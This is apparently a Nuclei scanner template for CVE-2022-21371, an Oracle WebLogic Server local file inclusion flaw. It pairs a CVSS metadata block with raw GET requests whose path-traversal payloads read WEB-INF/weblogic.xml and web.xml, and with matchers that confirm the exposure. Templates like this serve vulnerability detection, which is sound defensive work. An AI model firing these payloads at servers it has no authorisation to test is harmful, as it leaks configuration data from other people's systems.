id: CVE-2022-21371
info:
  author: paradessia,narluin
  classification:
    cve-id: CVE-2022-21371
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
  description: An easily exploitable local file inclusion vulnerability allows unauthenticated
    attackers with network access via HTTP to compromise Oracle WebLogic Server. Supported
    versions that are affected are 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.
    Successful attacks of this vulnerability can result in unauthorized and sometimes
    complete access to critical data.
  name: Oracle WebLogic Server Local File Inclusion
  reference:
  - https://www.oracle.com/security-alerts/cpujan2022.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-21371
  - https://gist.github.com/picar0jsu/f3e32939153e4ced263d3d0c79bd8786
  severity: high
  tags: cve,cve2022,lfi,weblogic,oracle
requests:
- matchers:
  - condition: or
    dsl:
    - contains(body, "<web-app") && contains(body, "</web-app>")
    - contains(body, "<weblogic-web-app") && contains(body, "</weblogic-web-app>")
    type: dsl
  - condition: or
    dsl:
    - contains(all_headers, "text/xml")
    - contains(all_headers, "application/xml")
    type: dsl
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  payloads:
    path:
    - .//WEB-INF/weblogic.xml
    - .//WEB-INF/web.xml
  raw:
  - 'GET {{path}} HTTP/1.1

    Host: {{Hostname}}


    '
  stop-at-first-match: true
  unsafe: true
